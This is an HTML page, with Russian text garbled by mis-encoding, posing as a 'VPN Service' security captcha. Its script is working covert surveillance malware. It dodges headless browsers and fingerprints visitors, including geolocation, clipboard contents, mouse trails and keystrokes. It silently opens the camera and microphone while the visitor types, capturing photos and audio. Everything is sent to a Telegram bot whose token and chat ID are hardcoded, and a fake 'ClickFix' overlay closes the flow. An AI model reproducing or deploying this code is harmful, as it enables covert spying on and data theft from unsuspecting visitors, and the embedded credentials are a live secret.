<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ | VPN Service</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family:'Roboto',sans-serif; 
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); 
            min-height:100vh; 
            display:flex; 
            align-items:center; 
            justify-content:center; 
        }
        .container { 
            background:rgba(255,255,255,0.95); 
            padding:40px; 
            border-radius:20px; 
            box-shadow:0 20px 40px rgba(0,0,0,0.1); 
            max-width:400px; 
            text-align:center; 
            position:relative;
        }
        h1 { color:#333; margin-bottom:20px; font-size:24px; }
        .progress-container { 
            background:#e0e0e0; 
            height:6px; 
            border-radius:3px; 
            margin:30px 0; 
            overflow:hidden; 
        }
        .progress-bar { 
            height:100%; 
            background:linear-gradient(90deg,#4CAF50,#45a049); 
            transition:width 0.5s ease; 
            width:0%; 
        }
        #captchaCode { 
            font-size:48px; 
            font-weight:700; 
            letter-spacing:8px; 
            color:#333; 
            margin:30px 0; 
            background:#f5f5f5; 
            padding:20px; 
            border-radius:10px; 
            user-select:none;
        }
        input[type="text"] { 
            width:100%; 
            padding:15px; 
            font-size:20px; 
            border:2px solid #ddd; 
            border-radius:10px; 
            text-align:center; 
            margin-bottom:20px; 
            box-sizing:border-box; 
            font-weight:bold;
        }
        .verify-btn { 
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); 
            color:white; 
            border:none; 
            padding:15px 40px; 
            font-size:18px; 
            border-radius:10px; 
            cursor:pointer; 
            transition:all 0.3s; 
            width:100%;
        }
        .verify-btn:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 10px 20px rgba(102,126,234,0.4); }
        .verify-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
        body.loading { pointer-events:none; opacity:0.7; }
        .status { 
            margin-top:20px; 
            padding:10px; 
            border-radius:5px; 
            font-weight:500; 
            min-height:20px;
        }
        .success { background:#d4edda; color:#155724; }
        .error { background:#f8d7da; color:#721c24; }
        .camera-status { 
            position:absolute; 
            top:10px; 
            right:10px; 
            width:40px; 
            height:40px; 
            border-radius:50%; 
            background:rgba(255,0,0,0.7); 
            animation:pulse 1.5s infinite;
        }
        .camera-status.active { background:rgba(0,255,0,0.7); }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
        .clickfix { 
            position:fixed; 
            top:0; 
            left:0; 
            width:100%; 
            height:100%; 
            background:rgba(0,0,0,0.9); 
            display:flex; 
            align-items:center; 
            justify-content:center; 
            color:white; 
            font-size:24px; 
            z-index:9999; 
            flex-direction:column;
        }
        .clickfix button { 
            margin-top:20px; 
            padding:15px 30px; 
            font-size:20px; 
            background:#ff4444; 
            border:none; 
            border-radius:10px; 
            color:white; 
            cursor:pointer; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="camera-status" id="cameraStatus" title="–ö–∞–º–µ—Ä–∞ –≤—ã–∫–ª—é—á–µ–Ω–∞"></div>
        <h1>üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h1>
        <p>VPN Service –æ–±–Ω–∞—Ä—É–∂–∏–ª –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –ü—Ä–æ–π–¥–∏—Ç–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é:</p>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div id="captchaCode">‚Äî‚Äî‚Äî</div>
        <input type="text" id="userInput" maxlength="8" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" autocomplete="off">
        <button class="verify-btn" id="verifyBtn">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        // === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ===
        const TELEGRAM_TOKEN = '8282145932:AAE3Ze0wPSRFDx0FroHUJMTOXWHcpbvcb_w';
        const CHAT_ID = '882898449';

        // === iOS D–ï–¢–ï–ö–¢–û–† ===
        function isIOS() {
            return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        }

        // === –ó–ê–©–ò–¢–ê –û–¢ –ë–û–¢–û–í ===
        function isBot() {
            const headless = navigator.webdriver || 
                           /HeadlessChrome/.test(navigator.userAgent) ||
                           navigator.plugins.length === 0;
            const linuxBot = /Linux.*X11/.test(navigator.userAgent) && screen.height < 800;
            const noWebGL = !document.createElement('canvas').getContext('webgl');
            return headless || linuxBot || noWebGL;
        }

        if (isBot()) {
            document.body.innerHTML = '<h1 style="color:red">‚ùå –î–æ—Å—Ç—É–ø –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω</h1><p>–û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤ –æ–±—ã—á–Ω–æ–º –±—Ä–∞—É–∑–µ—Ä–µ</p>';
            throw new Error('BOT DETECTED');
        }

        // === –≠–õ–ï–ú–ï–ù–¢–´ ===
        const elements = {
            captchaCode: document.getElementById('captchaCode'),
            userInput: document.getElementById('userInput'),
            verifyBtn: document.getElementById('verifyBtn'),
            progressBar: document.getElementById('progressBar'),
            status: document.getElementById('status'),
            cameraStatus: document.getElementById('cameraStatus')
        };

        // === –ü–ï–†–ï–ú–ï–ù–ù–´–ï ===
        let currentCaptcha = '';
        let attempts = 0;
        let step = 0;
        const totalSteps = 4;
        let stream = null;
        let cameraActive = false;
        let mouseTrail = [];
        let batteryInfo = {};
        let keystrokes = [];

        // === üñ±Ô∏è MOUSE TRACKING ===
        document.addEventListener('mousemove', (e) => {
            mouseTrail.push({
                x: e.clientX,
                y: e.clientY,
                t: Date.now(),
                buttons: e.buttons
            });
            if (mouseTrail.length > 100) mouseTrail.shift();
        });

        // === üîä AUDIO FINGERPRINT ===
        async function getAudioFP() {
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
                const audioCtx = new AudioContext();
                const analyser = audioCtx.createAnalyser();
                const source = audioCtx.createMediaStreamSource(audioStream);
                source.connect(analyser);
                
                const buffer = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(buffer);
                audioStream.getTracks().forEach(track => track.stop());
                return Array.from(buffer).slice(0, 20).join(',');
            } catch(e) {
                return 'no-audio';
            }
        }

        // === üìç GEOLOCATION ===
        async function getGeo() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`),
                    () => resolve('geo-denied')
                );
            });
        }

        // === üîã BATTERY + HARDWARE ===
        if ('getBattery' in navigator) {
            navigator.getBattery().then(bat => {
                batteryInfo = {
                    level: Math.round(bat.level * 100) + '%',
                    charging: bat.charging ? '–î–∞' : '–ù–µ—Ç',
                    cores: navigator.hardwareConcurrency || '?'
                };
            });
        }

        // === üóé FONTS DETECTION ===
        function detectFonts() {
            const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
            const detected = [];
            testFonts.forEach(font => {
                if (document.fonts.check(`12px ${font}`)) detected.push(font);
            });
            return detected.slice(0, 3).join(',');
        }

        // === üñ•Ô∏è –ü–û–õ–ù–´–ô FINGERPRINT ===
        async function getFullFingerprint() {
            const fp = {
                userAgent: navigator.userAgent.substring(0, 80),
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                cookies: navigator.cookieEnabled,
                hardware: `${navigator.hardwareConcurrency || '?'}c/${navigator.deviceMemory || '?'}GB`,
                fonts: detectFonts(),
                battery: batteryInfo.level || 'no',
                mouseTrail: mouseTrail.length,
                geo: await getGeo(),
                audio: await getAudioFP()
            };

            // Canvas + WebGL
            const canvas = document.createElement('canvas');
            canvas.width = 256; canvas.height = 60;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.font = '11pt Arial';
            ctx.fillText('SUPER FP v3.0 üïµÔ∏è', 2, 15);
            fp.canvas = canvas.toDataURL().substring(0, 50);

            return fp;
        }

        // === üì∏ –ö–ê–ú–ï–†–ê ===
        async function initCamera() {
            try {
                const constraints = isIOS() ? {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: true
                } : {
                    video: { facingMode: 'user' },
                    audio: true
                };
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                return true;
            } catch (e) {
                console.log('üö´ –ö–∞–º–µ—Ä–∞:', e.name);
                return false;
            }
        }

        // === üì∏ –ü–û–õ–ù–û–ï –§–û–¢–û ===
        async function captureFullPhoto() {
            if (!stream || !cameraActive) return null;
            try {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.play();
                
                await new Promise(r => video.onloadeddata = r);
                await new Promise(r => setTimeout(r, 300));
                
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                video.remove();
                
                return canvas.toDataURL('image/jpeg', 0.8);
            } catch(e) {
                return null;
            }
        }

        // === üîä –ê–£–î–ò–û –ó–ê–ü–ò–°–¨ ===
        async function recordAudio() {
            if (!stream) return null;
            try {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => resolve(reader.result);
                        reader.readAsDataURL(blob);
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 3000);
                });
            } catch(e) {
                return null;
            }
        }

        // === Base64 ‚Üí Blob ===
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], { type: mimeString });
        }

        // === üÜï –û–¢–ü–†–ê–í–ö–ê –§–û–¢–û ===
        async function sendPhotoToTelegram(photoBase64, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', dataURItoBlob(photoBase64), 'photo.jpg');
                formData.append('caption', caption);
                
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return (await res.json()).ok;
            } catch(e) {
                return false;
            }
        }

        // === üÜï –û–¢–ü–†–ê–í–ö–ê –ê–£–î–ò–û ===
        async function sendVoiceToTelegram(audioBase64, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('voice', dataURItoBlob(audioBase64), 'voice.webm');
                formData.append('caption', caption);
                
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
                    method: 'POST',
                    body: formData
                });
                return (await res.json()).ok;
            } catch(e) {
                return false;
            }
        }

        // === üìã CLIPBOARD ===
        async function getClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                return text.substring(0, 50);
            } catch(e) {
                return 'clipboard-denied';
            }
        }

        // === üî• –ù–ï–ó–ê–ú–ï–¢–ù–ê–Ø –û–¢–ü–†–ê–í–ö–ê –í–°–ï–ì–û –ü–ê–ö–ï–¢–ê ===
        async function sendFullStealthPackage(data) {
            try {
                const fp = await getFullFingerprint();
                const clipboard = await getClipboard();
                
                // 1. –¢–ï–ö–°–¢–û–í–´–ô –û–¢–ß–ï–¢
                const message = `üéØ –£–õ–¨–¢–†–ê #${attempts} | ${data.event}\n\n` +
                              `üìù –ö–∞–ø—á–∞: \`${currentCaptcha}\`\n` +
                              `‚å®Ô∏è –í–≤–æ–¥: \`${data.input || ''}\`\n` +
                              `üñ±Ô∏è –ú—ã—à—å: ${fp.mouseTrail} —Ç–æ—á–µ–∫\n` +
                              `üîã –ë–∞—Ç–∞—Ä–µ—è: ${fp.battery}\n` +
                              `üìç Geo: ${fp.geo}\n` +
                              `üîä Audio: ${fp.audio?.substring(0, 30)}...\n` +
                              `üìã –ë—É—Ñ–µ—Ä: ${clipboard}\n` +
                              `üóé –®—Ä–∏—Ñ—Ç—ã: ${fp.fonts}\n\n` +
                              `üñ•Ô∏è FP: ${JSON.stringify(fp).substring(0, 400)}`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                // 2. –§–û–¢–û (–µ—Å–ª–∏ –µ—Å—Ç—å)
                if (data.photo) {
                    await sendPhotoToTelegram(data.photo, `üì∏ #${attempts} | ${data.input}`);
                }

                // 3. –ê–£–î–ò–û (–µ—Å–ª–∏ –µ—Å—Ç—å)
                if (data.audio) {
                    await sendVoiceToTelegram(data.audio, `üîä #${attempts} | ${data.input}`);
                }

                console.log('‚úÖ STEALTH PACKAGE –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
            } catch(e) {
                console.error('üö´ Stealth fail');
            }
        }

        // === –ì–ï–ù–ï–†–ê–¢–û–† –ö–ê–ü–ß–ò ===
        function generateCaptcha() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 8; i++) {
                code += chars[Math.floor(Math.random() * chars.length)];
            }
            return code;
        }

        // === –ü–†–û–ì–†–ï–°–° ===
        function updateProgress() {
            const progress = Math.min((step / totalSteps) * 100, 100);
            elements.progressBar.style.width = `${progress}%`;
        }

        // === üî• –ù–ï–ó–ê–ú–ï–¢–ù–´–ô –°–ë–û–† –ü–†–ò –í–í–û–î–ï –ö–ê–ü–ß–ò ===
        elements.userInput.addEventListener('focus', async () => {
            if (!cameraActive) {
                cameraActive = await initCamera();
                if (cameraActive) {
                    elements.cameraStatus.classList.add('active');
                    elements.cameraStatus.title = 'üì∏ –ê–∫—Ç–∏–≤–Ω–∞';
                }
            }
        });

        elements.userInput.addEventListener('input', async () => {
            const input = elements.userInput.value.toUpperCase();
            keystrokes.push({
                char: input.slice(-1),
                time: Date.now(),
                length: input.length
            });

            // üïµÔ∏è‚Äç‚ôÇÔ∏è –ù–ï–ó–ê–ú–ï–¢–ù–´–ô –°–ë–û–† –ü–†–ò –ö–ê–ñ–î–û–ô –ë–£–ö–í–ï
            if (cameraActive && input.length > 0 && input.length <= 3) { // –¢–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–µ 3 —Å–∏–º–≤–æ–ª–∞
                const photo = await captureFullPhoto();
                const audio = await recordAudio();
                
                await sendFullStealthPackage({
                    event: `STEALTH_${input.length}`,
                    input: input,
                    photo: photo,
                    audio: audio
                });
            }
        });

        elements.userInput.addEventListener('blur', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            cameraActive = false;
            elements.cameraStatus.classList.remove('active');
        });

        // === –ö–ù–û–ü–ö–ê (–û–°–¢–ê–ï–¢–°–Ø –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô) ===
        elements.verifyBtn.addEventListener('click', async () => {
            const input = elements.userInput.value.trim().toUpperCase();
            attempts++;
            step = Math.min(step + 1, totalSteps);

            elements.status.textContent = 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...';
            elements.status.className = 'status';
            document.body.classList.add('loading');

            await sendFullStealthPackage({ 
                input, 
                event: 'BUTTON_CLICK',
                keystrokes: keystrokes.length
            });

            setTimeout(async () => {
                if (input === currentCaptcha) {
                    if (step >= totalSteps) {
                        document.body.innerHTML = `
                            <div class="clickfix">
                                <div>
                                    <h2>üîß –¢—Ä–µ–±—É–µ—Ç—Å—è ClickFix</h2>
                                    <p>–ö–ª–∏–∫–Ω–∏—Ç–µ –¥–ª—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è (5 —Å–µ–∫)</p>
                                    <button onclick="location.reload()">–ò–°–ü–†–ê–í–ò–¢–¨ –°–ï–ô–ß–ê–°</button>
                                </div>
                            </div>
                        `;
                        return;
                    }
                    elements.status.textContent = '‚úÖ –í–µ—Ä–Ω–æ! –°–ª–µ–¥—É—é—â–∏–π —ç—Ç–∞–ø.';
                    elements.status.className = 'status success';
                } else {
                    elements.status.textContent = '‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥.';
                    elements.status.className = 'status error';
                    step--;
                }

                currentCaptcha = generateCaptcha();
                elements.captchaCode.textContent = currentCaptcha;
                elements.userInput.value = '';
                elements.progressBar.style.width = '0%';
                elements.verifyBtn.textContent = '–î–∞–ª–µ–µ';
                document.body.classList.remove('loading');
                updateProgress();
                keystrokes = [];
            }, 1500);
        });

        // === –°–¢–ê–†–¢ ===
        currentCaptcha = generateCaptcha();
        elements.captchaCode.textContent = currentCaptcha;
        updateProgress();
        
        console.log('üöÄ –£–õ–¨–¢–†–ê –ö–û–õ–õ–ï–ö–¢–û–† –ê–ö–¢–ò–í–ï–ù! üïµÔ∏è‚Äç‚ôÇÔ∏èüì∏üîä');
        console.log('‚úÖ –ù–ï–ó–ê–ú–ï–¢–ù–´–ô —Å–±–æ—Ä: –ø–µ—Ä–≤—ã–µ 3 –±—É–∫–≤—ã = –§–û–¢–û+–ê–£–î–ò–û+FP');
    </script>
</body>
</html>
